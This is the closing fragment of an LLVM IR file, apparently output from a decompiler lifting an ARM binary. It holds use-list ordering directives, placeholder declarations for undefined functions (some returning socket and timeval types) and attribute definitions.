  uselistorder i1 false, { 0, 11, 1, 24, 15, 28, 25, 23, 26, 2, 3, 4, 5, 6, 14, 7, 13, 8, 12, 9, 10, 16, 17, 18, 27, 22, 19, 20, 21, 29 }
  uselistorder i1* @cpsr_z, { 7, 3, 4, 0, 1, 2, 5, 6 }
  uselistorder label %bb1, { 1, 0 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare %sockaddr* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8* @__decompiler_undefined_function_3() local_unnamed_addr

declare %timeval* @__decompiler_undefined_function_4() local_unnamed_addr

declare i32* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_fd_set* @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
